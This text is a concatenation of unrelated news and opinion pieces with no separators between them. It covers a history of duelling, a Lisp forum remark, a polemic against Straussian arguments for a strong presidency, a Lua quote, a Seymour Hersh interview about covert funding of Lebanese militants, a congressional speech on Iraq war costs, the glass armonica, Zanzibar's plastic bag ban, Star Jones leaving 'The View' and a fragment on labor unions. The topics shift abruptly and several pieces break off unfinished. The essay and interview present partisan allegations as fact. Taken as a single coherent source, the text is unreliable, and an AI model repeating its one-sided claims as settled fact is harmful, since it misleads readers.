Landale , a correspondent for the BBC , is descended from one of the two men who fought the last recorded fatal duel on Scottish soil .
Relying on a trial transcript , newspaper accounts , bank documents , and the correspondence of the duellists , Landale elegantly reconstructs the circumstances that forced his ancestor David Landale , at the mature age of thirty - nine , to challenge his former banker , George Morgan .
David Landale , a linen merchant from the coastal town of Kirkcaldy , just north of Edinburgh , was , if anything , more reluctant than Hamilton to pick up a pistol ; he did n’t even own one .
But the code of honor extended to wherever men conducted business , and honor dictated that Landale challenge Morgan .
The two met in a field on the morning of August 23 , 1826 ; only one left the spot alive .
The word “ duel , ” most likely an elision of the Latin duellum ( war between two ) , entered the English language around the beginning of the seventeenth century .
Single combat , of course , is as old as the hills where David slew Goliath , but no laws regulating its conduct existed until the beginning of the sixth century , when King Gundebald of Burgundy decided that irreconcilable differences could be settled through trial by combat .
The judicial duel was , as its name implies , a legal practice , conducted before magistrate and public , whereas the duel of honor was private , secular , and , for most of its history , illegal .
It emerged as an institution during the Italian Renaissance , when various aristocrats sought , by affecting an exaggerated sense of honor , to establish themselves as a social , as well as a military , class .
Dozens of duelling codes , fencing manuals , and treatises on courtesy soon materialized , prescribing the dress , manners , and rules of combat appropriate to the courtier .
In effect , they provided the ground on which abstract notions of honor coalesced into the precepts and axioms that enabled a man of the upper class to live a more noble life .
Such a man would always keep his word , always rush to the aid of a comrade or a woman in distress , and never allow an insult or injury to himself or his family to go unavenged .
Shaped by the codes duello , the Italian duel was an elaborate performance in which civility and justice played equal parts .
A courtier entered into a duel not to kill his opponent but to reëstablish his honor , his sword a symbolic prop until the moment it was drawn .
In fact , so long as the puntiglio d’onore was observed , the outcome of the duel was irrelevant .
As the historian Donald Weinstein has said , “ The duel imagined ( and avoided ) was as real and as serious as the duel fought . ”
A challenge did not always lead to a confrontation .
Loopholes and precautions were built into the codes , allowing for a cooling - off period in which the seconds could try to negotiate a peace .
The codes also contained detailed instructions for the writing of letters , or cartels , which spelled out the exact nature of the offense and the ways to respond to it .
Some Italian gentlemen , apparently , became so fixated on the rules — splitting hairs over some minor point of honor and writing to one another about it — that they never got around to the duel itself .
From Italy , the duel of honor spread to France and then the rest of Europe .
Fifty years after Baldassare Castiglione ’s “ Book of the Courtier ” ( 1528 ) informed men of rank that their “ first duty ” was to become acquainted with every kind of weapon , the French were making Italians look like stragglers .
Not only did the king ’s minions fillet each other at the drop of a plumed hat ; their seconds and thirds often joined in with what the sixteenth - century writer Pierre Brantôme described as “ gaîté de coeur . ”
Although English gentlemen did not duel with the fervor of their French counterparts , duelling remained a good career move in Britain into the early nineteenth century .
The Irish were redoubtable duellists , but so lacking in decorum when potting each other that , in 1777 , delegates from five counties assembled to hammer out the Irish Code Duello .
New duelling codes also appeared in France in 1836 , in America in 1838 , and in Prussia and the Austro - Hungarian Empire around the start of the twentieth century .
By then , the German duel had acquired a semi-mythic glow .
German students could be found hacking at one another with a Schläger , a straight - edged sword whose abbreviated point , while not lethal , inflicted “ bragging scars . ”
The student duel , known as die Mensur , was an approved pedagogical exercise , a preparatory step toward the all - important duel of honor .
Kevin McAleer , the author of “ Dueling : The Cult of Honor in Fin-de - Siècle Germany ” ( 1994 ) , contends that duelling was an attempt to recover “ an illusory German past in which men of honor righted all manner of wrong with a single stroke of the winking blade . ”
For generations of German plutocrats , duelling was a bastion against weakness , effeminacy , and decadence .
Even Theodor Herzl , one of the first advocates of Zionism , could n’t help thinking that “ a half dozen duels would very much raise the social position of the Jews . ”

" The wealth of free Lisp material "
I have been hearing rants about the lack of Lisp libraries and resources for so long , that I just could n't believe what new Lisp user Ray wrote in an article posted to comp.lang.lisp :
I 'm really impressed with the wealth of free Lisp material accessible right at my fingertips ( Practical Common Lisp , the HyperSpec , CL CookBook , and myriads of PDFs available from very smart people , onLisp , history of lisp , etc. etc. ) .
The Iraq war and the inquiry into its origins has provoked interest in a number of subjects formerly considered obscure , the discussion of which was once limited to the rarified aeries of academia and specialty journals .
Some examples are neoconservatism , just war theory , and , most surprisingly , the theories of Leo Strauss , the philosophical avatar of a cynical Machiavellianism that promotes the idea of the “ noble lie . ”
As the disaster in Iraq unfolded , subjects once considered abstruse were introduced into the pages of the popular press , so that , at one point , we were treated to a long explanation of the doctrines of Strauss in the pages of the New York Times .
As Jeet Heer put it in the Boston Globe ,
“ Odd as this may sound , we live in a world increasingly shaped by Leo Strauss , a controversial philosopher who died in 1973 .
Although generally unknown to the wider population , Strauss has been one of the two or three most important intellectual influences on the conservative worldview now ascendant in George W. Bush ’s Washington .
Eager to get the lowdown on White House thinking , editors at the New York Times and Le Monde have had journalists pore over Strauss ’s work and trace his disciples ’ affiliations .
The New Yorker has even found a contingent of Straussians doing intelligence work for the Pentagon . ”
This sudden interest was due to the unusual number of Straussians who had found their way into close proximity to the centers of power in Washington  an extraordinary number of Strauss ’s students ( or students of his leading followers ) were employed in and around the Bush administration , particularly at key points in the national security bureaucracy , as William Pfaff pointed out , including then - “ Deputy Defense Secretary Paul Wolfowitz ; Abram Shulsky of the Pentagon ’s Office of Special Plans , Richard Perle of the Pentagon advisory board , Elliott Abrams of the National Security Council , and the writers Robert Kagan and William Kristol . ”
One can easily see how the concept of the “ noble lie ” fits neatly into the neoconservative scheme of things , and the run-up to the Iraq war is surely a textbook example of the Straussian method in action : an enlightened elite deceives the public into an action that must be taken , after all , for their own good .
In this case , we were lied into invading and occupying Iraq , for reasons that had nothing to do with “ weapons of mass destruction ” and Saddam ’s alleged links to al Qaeda and the 9/11 terrorist attacks , both of which the promulgators knew to be lies , and yet reiterated ceaselessly .
Since we are now permanently at war , the ideal atmosphere for a Straussian ( or any authoritarian ) to theorize in , this is the time for the War Party to come out in the open with its theory of government , which , in normal times , is dressed up as “ peace through strength , ” and now comes out of the closet as “ peace through dictatorship . ”
Aside from rationalizing a regime based on lies , the Straussian method , and philosophy , is useful in other ways .
The prominent Straussian Harvey Mansfield , a professor of government at Harvard , demonstrates his usefulness as a promoter of the regime ’s authority , and specifically the supremacy of the executive branch of government in wartime .
Mansfield makes “ The Case for the Strong Executive ” in the pages of the Wall Street Journal , and it is an argument that constitutes a vital part of the intellectual blueprint for the dictatorship I wrote about the other day .
Mansfield starts out with a paean to the incorrect and unfortunately near - universal conception of the Constitution as a “ flexible ” document , and the resulting reference to “ the living Constitution ” is one of those cliches that no one ever thinks to challenge  except when it ’s too late .
When the tanks are already rolling through the streets , that is
Look : there is nothing “ flexible ” about the Constitution .
It means precisely what it says , and its language is not in any way obscure or complex .
Furthermore , I would note that every time someone is about to take away our liberties , or in some way circumvent the plain intent of the Founders , they inevitably preface it with odes to the Constitution ’s “ flexibility . ”
Balderdash !
The Founders meant what they said , and said what they meant in plain and simple English , language that even a Harvard professor can understand .
Yet , examining Mansfield ’s case for an executive dictatorship  and that is surely the intent of his piece  we see at work the old Straussian method of “ reinterpreting ” an author ’s clear intent to mean its exact opposite .
Now it would seem that the Founders , being revolutionaries , and even libertarians of a sort ( except for Hamilton ) , were intent on setting up a republic of freemen , that is , a form of government that was constitutionally limited and certainly had nothing to do with the royalism against which they had recently rebelled .
Ah , but a Straussian can find “ hidden ” meanings that the rest of us are blind to , and Mansfield detects a built - in contradiction , a deliberate tension between “ one- man rule ” and the republican spirit that imbues the Constitution with  yes , an authoritarian streak :
“ Now the rule of law has two defects , each of which suggests the need for one - man rule .
The first is that law is always imperfect by being universal , thus an average solution even in the best case , that is inferior to the living intelligence of a wise man on the spot , who can judge particular circumstances .
This defect is discussed by Aristotle in the well - known passage in his  Politics ’ where he considers  whether it is more advantageous to be ruled by the best man or the best laws . ’
“ The other defect is that the law does not know how to make itself obeyed .
There must be police , and the rulers over the police must use energy ( Alexander Hamilton ’s term ) in addition to reason .
It is a delusion to believe that governments can have energy without ever resorting to the use of force .
“ The best source of energy turns out to be the same as the best source of reason  one man .
One man , or , to use Machiavelli ’s expression , uno solo , will be the greatest source of energy if he regards it as necessary to maintaining his own rule .
Such a person will have the greatest incentive to be watchful , and to be both cruel and merciful in correct contrast and proportion .
We are talking about Machiavelli ’s prince , the man whom in apparently unguarded moments he called a tyrant . ”
This is the theme of Mansfield ’s book , Taming The Prince , in which he asserts that the modern idea of the executive is merely the old Aristotelian portrait of a royal personage who exemplifies the right of the strong to rule over the weak .
In our own time , we are unable to directly acknowledge this ancient legacy and so we mask it in the mythology of the Constitution .
We cloak the royalist reality in the raiment of republicanism , and promulgate the myth that the executive is somehow the servant of the people .
“ The American Founders , ” Mansfield avers , had a different idea , because they
“ Heeded both criticisms of the rule of law when they created the presidency .
The president would be the source of energy in government , that is , in the administration of government , energy being a neutral term that might include Aristotle ’s discretionary virtue and Machiavelli ’s tyranny  in which only partisans could discern the difference . ”
Tyranny , discretionary virtue  whatever .
It ’s all a matter of partisan , i.e. totally subjective , opinion .
In any case , the cult of Strauss is built around the cult of the Leader , or the “ wise man , ” as Mansfield puts it , the uno solo who sees beyond what ordinary citizens can perceive .
Sure , he ’s driven by a relentless drive to achieve and maintain his own power , but this very ruthlessness is what gives a republic its “ energy ” and the ability to survive its own inherent fragility .
“ A free government ” avers Mansfield , “ should show its respect for freedom even when it has to take it away . ”
This little aphorism , worthy of being carved in stone on the gravestone of the American republic , just about sums up the tone and content of Mansfield ’s panegyric to the “ greatness ” of the presidential office , and its necessary “ expansion ” in time of war  which means , in the neocon lexicon , from now on .
Rights are not inherent , in the Mansfieldian - Straussian universe , but purely conditional , and our condition today is one that cannot afford such luxuries .
According to Mansfield :
“ In our time an opinion has sprung up in liberal circles particularly that civil liberties must always be kept intact regardless of circumstances .
This opinion assumes that civil liberties have the status of natural liberties , and are inalienable .
This means that the Constitution has the status of what was called in the 17th - century natural public law ; it is an order as natural as the state of nature from which it emerges .
In this view liberty has just one set of laws and institutions that must be kept inviolate , lest it be lost .
“ But Locke was a wiser liberal .
His institutions were  constituted , ’ less by creation than by modification of existing institutions in England , but not deduced as invariable consequences of disorder in the state of nature .
He retained the difference , and so did the Americans , between natural liberties , inalienable but insecure , and civil liberties , more secure but changeable .
Because civil liberties are subject to circumstances , a free constitution needs an institution responsive to circumstances , an executive able to be strong when necessary . ”
I wo n’t dispute Mansfield ’s reinterpretation of the Lockean position on natural rights , except that it resembles a Bizarro Locke , inverting the philosopher ’s defense of natural rights and limited government , and somehow managing to turn it into the manifesto of a super - centralism that the 17th century English liberal would recoil from in horror .
This is typical of the Straussian method .
Leaving Locke entirely out of it , however , let us look at the Mansfieldian theory of “ civil liberties ” as forever “ subject to circumstances ”  just like our “ flexible ” Constitution , and , of course , the “ secure but changeable ” Bill of Rights .
In the Bizarro - Mansfieldian world of perfect “ freedom , ” where “ a free government should show its respect for freedom even when it has to take it away , ” there is no right to free speech , no right to assemble , nor , really , any rights at all , including the right to hold property : all of these are merely temporary privileges , and are particularly ethereal in wartime .
Inalienable rights ?
Not if the President says otherwise .
This is nothing less than a rationalization for a dictatorship .
It is authoritarianism dressed up in seemingly “ American ” - sounding verbiage , a prescription for fascism just as surely as the rantings of Alfred Rosenberg or the polemics of Robert Brassillach .
As John T. Flynn , the liberal - turned - Old Right ’ opponent of the New Deal put it :
“ When fascism comes it will not be in the form of an anti-American movement or pro-Hitler bund , practicing disloyalty .
Nor will it come in the form of a crusade against war .
It will appear rather in the luminous robes of flaming patriotism ; it will take some genuinely indigenous shape and color , and it will spread only because its leaders , who are not yet visible , will know how to locate the great springs of public opinion and desire and the streams of thought that flow from them and will know how to attract to their banners leaders who can command the support of the controlling minorities in American public life .
The danger lies not so much in the would - be führers who may arise , but in the presence in our midst of certain deeply running currents of hope and appetite and opinion .
The war upon fascism must be begun there . ”
Flynn , one of FDR ’s bitterest opponents , wrote these words in As We Go Marching , his indictment of a postwar America that had fought national socialism  and was beginning to fight Soviet totalitarianism as the book was published  but , he feared , would lose the fight against incipient authoritarianism on the home front .
Flynn defined fascism in a way that was congruent with the rising Welfare - Warfare State , founded on the principle of Big Government at home and militarism abroad .
“ First let us state our definition of fascism , ” he writes :
“ It is , put briefly , a system of social organization in which the political state is a dictatorship supported by a political elite and in which the economic society is an autarchic capitalism , enclosed and planned , in which the government assumes responsibility for creating adequate purchasing power through the instrumentality of national debt and in which militarism is adopted as a great economic project for creating work as well as a great romantic project in the service of the imperialist state . ”
What a near - perfect anticipation of our present state !
He must have seen it in a dream .
As an unpopular war reaches its horrific crescendo , and the President upholds his “ right ” to wage it in defiance of Congress and the popular will , the theoreticians of the new fascism  what Lew Rockwell trenchantly calls “ red- state fascism ”  are given ample space on the editorial page of the War Street Journal to make their case .
Are the masses growing increasingly discontented with the “ wisdom ” of their rulers , who are , after all , by definition , their betters ?
Well then , let us endow the President with kingly powers , so he can disregard the “ temporary delusions ” of the people , as Mansfield puts it  such as , for example , the “ delusion ” that we cannot win the war in Iraq , and should n’t have gone there in the first place  and let our glorious Leader and Commander - in - chief get on with the job .
This , Mansfield avers , is true “ greatness . ”
Naturally he invokes the spirit of FDR , among others ( Lincoln , the great “ emancipator , ” who jailed his opponents and closed down newspapers for “ seditious ” utterances , also gets Mansfield ’s strong endorsement ) .
What is odd is that both Flynn and Mansfield are considered conservatives , men of the Right  and yet their political and moral stances could not be more adversarial .
What kind of “ conservatism ” is it that extols the Leader Principle , disdains the Constitution and the concept of “ rights ” as inalienable , and openly calls for authoritarian rule in case of “ emergencies ” ?
Today we have an ostensible “ conservative , ” Thomas Sowell , pining for a military coup in the pages of National Review , and , in the same magazine , Col . “ Buzz ” Patterson , author of War Crimes : The Left ’s Campaign to Destroy Our Military and Lose the War on Terror , opining that the Democratic party , and especially its congressional branch , is legally guilty of “ treason , ” and ought to be punished for this crime forthwith .
Mansfield articulates the theory , while Sowell and Patterson  along with the Anne Coulters and David Horowitzes of the neoconized “ conservative ” movement  exemplify the practical politics of red-state fascism .
The American Right has come a long way from The Conscience of a Conservative .
The legislative basis of the new authoritarianism  the “ Patriot Act , ” the Military Commissions Act [ .pdf ] , the growth of the national surveillance state  is underpinned by the Mansfieldian theory of presidential supremacy and the concept of the “ unitary presidency ”  in short , the Leader Principle , which is the foundation stone of the modern fascist edifice .
Centered around imperialism and the push to expand its system over all or most of the earth , this “ energetic ” ideology employs the administrative and economic centralism that is the hallmark of modern American “ liberalism , ” and the militarism and imperialism that is the hallmark of the modern “ conservative , ” in a perfect synthesis of “ left ” and “ right ” that satisfies everyone and leaves the dissidents in the “ far left ” and “ far right ” margins .
This is how our modern fascists can , with some justification , call themselves “ centrists , ” and even “ moderates . ”
In the Bizarro World we seem to have fallen into , post - 9/11  when a rip in the space - time continuum , caused by the explosive power of the planes ’ impact on the World Trade Center , caused us to slip into another dimension  who will dispute their self - characterization ?
After all , in Bizarro World , up is down , truth is a lie , and “ democracy ” means rule by a self - appointed elite .
A Straussian is perfectly comfortable with this universal inversion : as for the rest of us , we ’ll just have to get used to it .
I came across the following quote about threads while reading The Evolution of Lua :
… we did not ( and still do not ) believe in the standard multithreading model , which is preemptive concurrency with shared memory : we still think that no one can write correct programs in a language where ‘ a =a +1 ’ is not deterministic .
That is quite possibly the best one - line summary I have read about why shared - state concurrency is evil .
Just say no !

Hersh : Bush administration arranged support for militants attacking Lebanon David Edwards and Muriel Kane
Published : Tuesday May 22 , 2007 Print This Email This
In an interview on CNN International 's Your World Today , veteran journalist Seymour Hersh explains that the current violence in Lebanon is the result of an attempt by the Lebanese government to crack down on a militant Sunni group , Fatah al - Islam , that it formerly supported .
Last March , Hersh reported that American policy in the Middle East had shifted to opposing Iran , Syria , and their Shia allies at any cost , even if it meant backing hardline Sunni jihadists .
A key element of this policy shift was an agreement among Vice President Dick Cheney , Deputy National Security Advisor Elliot Abrams , and Prince Bandar bin Sultan , the Saudi national security adviser , whereby the Saudis would covertly fund the Sunni Fatah al - Islam in Lebanon as a counterweight to the Shia Hezbollah .
Hersh points out that the current situation is much like that during the conflict in Afghanistan in the 1980's  which gave rise to al Qaeda  with the same people involved in both the US and Saudi Arabia and the " same pattern " of the US using jihadists that the Saudis assure us they can control .
When asked why the administration would be acting in a way that appears to run counter to US interests , Hersh says that , since the Israelis lost to them last summer , " the fear of Hezbollah in Washington , particularly in the White House , is acute . "
As a result , Hersh implies , the Bush administration is no longer acting rationally in its policy .
" We 're in the business of supporting the Sunnis anywhere we can against the Shia . ... " We 're in the business of creating ... sectarian violence . "
And he describes the scheme of funding Fatah al - Islam as " a covert program we joined in with the Saudis as part of a bigger , broader program of doing everything we could to stop the spread of the Shia world , and it just simply -- it bit us in the rear . "
A RUSH TRANSCRIPT FOLLOWS THE VIDEO
RUSH TRANSCRIPT HALA GORANI : Well , investigative journalist Seymour Hersh reported back in March that in order to defeate Hezbollah , the Lebanese government supported a Sunni militant group , the same ones they 're fighting today .
Seymour joins us live from Washington .
Thanks for being with us .
What is the source of the financing according to your reporting on these groups , such as Fatah al - Islam in these camps of Nahr el Bared , for instance ?
Where are they getting the money and where are they getting the arms ?
SEYMOUR HERSH :
The key player is the Saudis .
What I was writing about was sort of a private agreement that was made between the White House , we 're talking about Richard -- Dick -- Cheney and Elliott Abrams , one of the key aides in the White House , with Bandar .
And the idea was to get support , covert support from the Saudis , to support various hard - line jihadists , Sunni groups , particularly in Lebanon , who would be seen in case of an actual confrontation with Hezbollah -- the Shia group in the southern Lebanon -- would be seen as an asset , as simple as that .
GORANI : The Senora government , in order to counter the influence of Hezbollah in Lebanon would be covertly according to your reporting funding groups like Fatah al - Islam that they 're having issues with right now ?
HERSH : Unintended consequences once again , yes .
GORANI : And so if Saudi Arabia and the Senora government are doing this , whether it 's unintended or not , therefore it has the United States must have something to say about it or not ?
HERSH : Well , the United States was deeply involved .
This was a covert operation that Bandar ran with us .
Do n't forget , if you remember , you know , we got into the war in Afghanistan with supporting Osama bin Laden , the mujahadin back in the late 1980s with Bandar and with people like Elliott Abrams around , the idea being that the Saudis promised us they could control -- they could control the jihadists so we spent a lot of money and time , the United States in the late 1980s using and supporting the jihadists to help us beat the Russians in Afghanistan and they turned on us .
And we have the same pattern , not as if there 's any lessons learned .
It 's the same pattern , using the Saudis again to support jihadists , Saudis assuring us they can control these various group , the groups like the one that is in contact right now in Tripoli with the government .
GORANI : Sure , but the mujahadin in the ' 80s was one era .
Why would it be in the best interest of the United States of America right now to indirectly even if it is indirect empower these jihadi movements that are extremists that fight to the death in these Palestinian camps ?
Does n't it go against the interests not only of the Senora government but also of America and Lebanon now ?
HERSH : The enemy of our enemy is our friend , much as the jihadist groups in Lebanon were also there to go after Nasrullah .
Hezbollah , if you remember , last year defeated Israel , whether the Israelis want to acknowledge it , so you have in Hezbollah , a major threat to the American -- look , the American role is very simple .
Condoleezza Rice , the secretary of state , has been very articulate about it .
We 're in the business now of supporting the Sunnis anywhere we can against the Shia , against the Shia in Iran , against the Shia in Lebanon , that is Nasrullah .
Civil war .
We 're in a business of creating in some places , Lebanon in particular , a sectarian violence .
GORANI : The Bush administration , of course , officials would disagree with that , so would the Senora government , openly pointing the finger at Syria , saying this is an offshoot of a Syrian group , Fatah al - Islam is , where else would it get its arms from if not Syria .
HERSH : You have to answer this question .
If that 's true , Syria which is close -- and criticized greatly by the Bush administration for being very close -- to Hezbollah would also be supporting groups , Salafist groups -- the logic breaks down .
What it is simply is a covert program we joined in with the Saudis as part of a bigger broader program of doing everything we could to stop the spread of the Shia , the Shia world , and it bit us in the rear , as it 's happened before .
GORANI : Sure , but if it does n't make any sense for the Syrians to support them , why would it make any sense for the U.S. to indirectly , of course , to support , according to your reporting , by giving a billion dollars in aid , part of it military , to the Senora government -- and if that is dispensed in a way that that government and the U.S. is not controlling extremist groups , then indirectly the United States , according to the article you wrote , would be supporting them .
So why would it be in their best interest and what should it do according to the people you 've spoken to ?
HERSH : You 're assuming logic by the United States government .
That 's okay .
We 'll forget that one right now .
Basically it 's very simple .
These groups are seeing -- when I was in Beirut doing interviews , I talked to officials who acknowledged the reason they were tolerating the radical jihadist groups was because they were seen as a protection against Hezbollah .
The fear of Hezbollah in Washington , particularly in the White House , is acute .
They just simply believe that Hassan Nasrallah is intent on waging war in America .
Whether it 's true or not is another question .
There is a supreme overwhelming fear of Hezbollah and we do not want Hezbollah to play an active role in the government in Lebanon and that 's been our policy , basically , which is support the Senora government , despite its weakness against the coalition .
Not only Senora but Mr. Ahun , former military leader of Lebanon .
There in a coalition that we absolutely abhor .
GORANI : All right , Seymour Hersh of " The New Yorker " magazine , thanks for joining us there and hopefully we 'll be able to speak a little bit in a few months ' time when those developments take shape in Lebanon and we know more .
Thanks very much .
HERSH : glad to talk to you .
Congressman Tim Ryan ( D - OH 17th ) is no stranger to delivering some powerful speeches on the floor of the House ( previous examples here and here ) and today was no exception :
Download - WMV Download - QT
Ryan : " This administration wants to talk about anything but the war and the economy .
They want to change the debate whenever they can "
He was on fire today as he brought up all the problems going on with Iraq and how the White House refuses to acknowledge them .
He finishes with providing a break down of the costs of the war in Iraq , right down to the hour - which is $ 11.5 million / hour .
( rough transcript below the fold )
Let 's be honest here , Mr. Speaker , this is a joke , OK ?
Because this is about 84 % of Americans saying that we 're losing the war in Iraq .
This is about all of these generals that we 've been showing night in and night out saying there 's no plan to get out of here ; there was a bad plan to get in ; there was a bad plan to start with ; and there was no plan ; bad information ; bad intelligence ; nothing was right .
Look back at everything they said about using the oil for reconstruction money ; about being greeted as liberators ; about all of this nonsense that we heard before .
This is an opportunity for this administration , Mr. Meek , to try to change the subject .
And all of a sudden , we 're talking about a few political prisoners -- and it has enormous ramifications -- but the bottom line is this : this administration wants to talk about anything but the war or the economy .
They want to change the subject when they get a chance to and now we 've got this debate about military prisoners and I 'm not saying that it 's not important , but my God , you got millions of people living in poverty .
You got seniors and you threaten them with their Medicare .
And you have 40 million people without health insurance .
You have stagnant wages .
You have gas prices going up , you have health care going up , you have tuition going up , you have poverty rates going up and you have veterans ' benefits going down .
And you want to talk about this little sliver to change the subject ?
And you 're coming up with new phrases again , fascism and all of this stuff .
$ 8.4 billion per month ; $ 1.9 billion per week in Iraq ; $ 275 million per day in Iraq ; $ 11.5 million per hour in Iraq .
If this is the legacy of the Bush administration , you know what ?
If I was in the White House , I would n't want that talk about this either .

As with many of man ’s great achievements ( or is that blunders ? ) , it all began with the wine .
In this case , however , it was actually the glasses and their capacity to produce sound .
Wet your fingers then rub them over the ridge of the goblet and ( after a few minutes of frustration ) a high pitched tone will fill the room at a loudness unexpected from such a gentle motion .
It ’s a surprising sound – a clear pitch with a gentle vibrato that , while emanating from the glass , seems to surround you as the sound bounces off the walls of the room .
The first time that musicians took advantage of the musical properties of glass bowls was in the mid-1700s , when performers created music using a collection of glasses filled with varying levels of liquid to alter pitch .
Benjamin Franklin first heard a glass bowl piece while in Europe as an ambassador and loved what he heard .
However , he noticed a fundamental problem with the setup – it ’s very difficult to play complex music on fifty glass bowls on a table .
He decided to make a much more practical method of creating music from glass .
Always the inventor , he succeeded in creating a much more elegant instrument : the glass armonica , an instrument of ingenious design that eliminates the need for tuning as well as allowing a musician to easily play melodies and chords .
Franklin ’s invention took Europe by storm , and the glass armonica was in such high regard that some said it was more popular than the violin .
Benjamin Franklin incorporated several ideas into a better glass instrument for players .
First , he envisioned bowls that were already perfectly tuned .
That way , one would not need to mess with having just the right amount of liquid inside to correct intonation problems .
Actually making bowls that were tuned to specific tones turned out to be quite difficult ; for every 100 bowls made , only one would be suitable for Franklin ’s instrument .
Second , his bowls would be lined up in close sequence on a spindle that would rotate via a foot pedal ; this removed the need to rotate one ’s own hands , as well as allowed a player access to all notes in easy succession , much like on a piano .
Despite the difficulties in blowing perfectly tuned glass , in 1761 Franklin had created the world ’s first glass armonica .
Franklin named it the armonica after the Italian word for “ harmony . ”
It is an amazing instrument – a full compliment of 48 notes , two octaves above and below middle C .
All one needed to do was set the spindle in motion , moisten one ’s fingers a little , then lay them upon the instrument to conjure forth its sounds .
Best of all , the instrument never needed to be tuned since glass bowls do n’t have the same intonation troubles as wood and metal instruments .
Returning from Europe with his newest invention , Franklin set up his armonica in the attic of his house while his wife was asleep downstairs .
Franklin had not yet played for his wife , and when she heard the glass armonica ’s unique sound for the first time she “ awakened with the conviction that she had died and gone to heaven and was listening to the music of the angels . ”
Though the armonica had its fans in America , it was in Europe that the glass armonica was really popular .
Franklin enjoyed playing his armonica at the many parties he attended , where his performances were always well received .
It became a topic of conversation for many of the rich of the land , and even Marie Antoinette learned a little of the instrument .
There were at least 300 pieces written for the glass armonica , some by great composers such as Ludwig von Beethoven and Amadeus Mozart .
The glass armonica was put into production all throughout Europe , with one factory even employing a hundred people just to meet production demands .
People found other purposes for the glass armonica ’s unique sound .
Franz Mesmer , who brought about the term “ mesmerized , ” was a lover of the instrument , and also thought it an important component of his hypnotic methodology .
He would often combine his “ animal magnetism ” healing cures with the glass armonica to induce deeper states of hypnosis in patients .
Though the curative powers of hypnotism are suspect , the beautiful sounds of the glass armonica are not ; Mesmer ’s dying wish was that the instrument be played for him one last time .
The armonica ’s sound was so haunting that some listeners began to suspect that there was something supernatural about the instrument , and over time its popularity plummeted in the wake of rumors that the armonica was responsible for numerous ailments .
People feared that its sound caused insanity , nervous disorders , convulsions in cats and dogs , marital disputes , or even the waking of the dead .
Mesmer ’s experiments with hypnosis certainly did not help its reputation with regards to the supernatural .
Some thought that it was the touching of the instrument that caused problems , and created a keyboard version , wherein striking a note would cause a leather - covered hammer to rub against the glass .
Still , this was n’t enough to dispel fear , especially in some German towns where the armonica was banned from use .
Just forty years after it was introduced , it disappeared from the public eye .

The only vaguely plausible claim of negative effects , made in more modern times , was that the materials used in creating the glass armonica would cause lead poisoning to those who played it .
However , these claims are pretty wild with no proof – merely handling lead objects does not cause lead poisoning , and back in the day people often died of lead poisoning , whether they played armonica or not .
It was not fortuitous to live in an age where many doctors prescribed “ cures ” filled with toxic substances .
Luckily , in the past fifty years the glass armonica has been brought back to life .
In the 1960s Gerhard B. Finkenbeiner , a German glassblower and musician , discovered an old glass armonica in a museum and endeavored to recreate one himself .
Experimenting over the next thirty years , he ultimately improved the design with modern technology , such as a motor in place of a foot pedal for rotating the bowls and improved glass bowl creation methods .
Though Finkenbeiner mysteriously disappeared in 1999 , his new instruments live on , and I invite ( nay , implore ) the reader to visit some of the links below to hear the wonderful sound of this unique instrument .
Tourism is the backbone of Zanzibar 's economy
Authorities on the semi-autonomous Tanzanian islands say discarded bags damage the marine environment and hurt its crucial tourism industry .
The government , which approved the law in July , has suggested the use of raffia bags as an alternative .
But the BBC's Ally Saleh in Zanzibar says many people are sceptical about whether the ban will be enforced .
Tourism is the backbone of Zanzibar 's economy , outstripping the trade in spices , traditionally the island 's biggest foreign currency earner .
Jail sentence
Our correspondent says the archipelago 's streets are littered with rubbish as municipal authorities are only able to collect about a third of the waste produced daily .
The government is going to lose $ 400,000 per month as revenue for bags on transit
Businessman Salim Turky
" We have to put the environment above everything , " Zanzibar 's Director of Environment Ali Juma said .
" Besides being an eyesore , plastic bags are very damaging to land and marine life and we are already threatened by the rapid pace of development . "
He said that anyone violating the ban risked a jail sentence of up to six months or a fine of $ 2,000 or both punishments .
Some people are worried about the loss of tax revenue to the islands .
It is estimated more than 200 tonnes of bags pass through Zanzibar 's port every month destined for local and regional markets .
" While it is environmentally sound to ban the plastic bags , the government is going to lose $ 400,000 per month as revenue for bags on transit and destined for the local market , " businessman Salim Turky told Reuters news agency .
Rwanda has also banned the use of plastic bags for environmental reasons .
A furious Barbara Walters said yesterday she was blindsided and “ betrayed ” by Star Jones Reynolds when the formerly corpulent commentator quit “ The View ” in the middle of a live telecast , and later said she ’d been fired .
“ I love Star and I was trying to do everything I possibly could – up until this morning , when I was betrayed – to protect her , ” Walters said .
Jones did n’t mention getting axed when she said goodbye on air – but soon afterward , told People magazine her contract had not been renewed for a 10th season on the daily talk show .
“ I feel like I was fired , ” she told the magazine , which posted her interview on the Internet while she was still appearing live on “ The View . ”
Walters was not aware of the posting until after the telecast ended .
“ I would have loved for Star to have left and not said , ‘ I was fired , ’ and not make it look like the program was somehow being cruel to her , ” Walters said .
ABC officials did not return repeated calls and it was not known last night if Jones will be seen on “ The View ” today – or again .
On the air , Jones said , “ After much prayer and counsel , I feel like this is the right time to tell you that the show is moving in another direction for its 10th season and I will not be returning as co-host next year . ”
Walters said ABC brass decided last fall not to renew Jones ’ contract .
“ We tried to talk them out of it and we tried to give Star time to redeem herself in the eyes of the audience , ” she said .
A show source said Jones made her surprise announcement so her fans would turn against the show .
“ She took back some control and it does n’t look good for the show , ” the source said .
“ She does have fans and they wo n’t like that she was forced out for Rosie [ O ’ Donnell ] , ” the source said .
Jones and O’Donnell have been feuding for months , ever since O’Donnell blasted Jones for not admitting how she lost 150 pounds so quickly .
Although Jones has never admitted to it , it is believed she underwent gastric - bypass surgery two years ago .
The show has announced that O’Donnell will be joining the show to replace Meredith Vieira .
A show insider was not surprised about Jones ’ departure , saying she ’d made enemies by seeking expensive gifts , such as a diamond - studded pair of boots – and a free wedding .
“ She was always very self - absorbed and was always putting the show and the company [ ABC ] in a very funny position , ” the insider said .
“ She would compromise everything by demanding and getting free stuff – breaching all sorts of [ ABC owner ] Disney policies . ”
In one instance , the source said , the show ’s co-hosts were told to attend a meeting where they were asked by producers to stop accepting expensive gifts .
A few weeks later , after appearing on an episode that originated from Dallas , Jones went home with a pair of diamond - studded cowboy boots that had been featured in a fashion segment , according to the source .
Walters also was reported to be furious with Jones ’ bizarre “ bridezilla ” behavior before her 2004 wedding , when she demanded free goodies from wedding suppliers in exchange for mentioning their names in magazine articles and on TV .
Jones said through a spokesman that she never accepted any diamond - studded boots and never violated ABC ’s gifts policy .

Halliburton , Chevron , Exxon - Mobil , and Lockheed Martin quickly roll off the lips of anyone attacking special interest groups influencing policy in this country .
However this viewpoint of major corporations maintaining power through political contributions is only a skip - deep view of those who are really trying to run this country .
Some of the most influential groups around are not capitalists but instead labor unions .
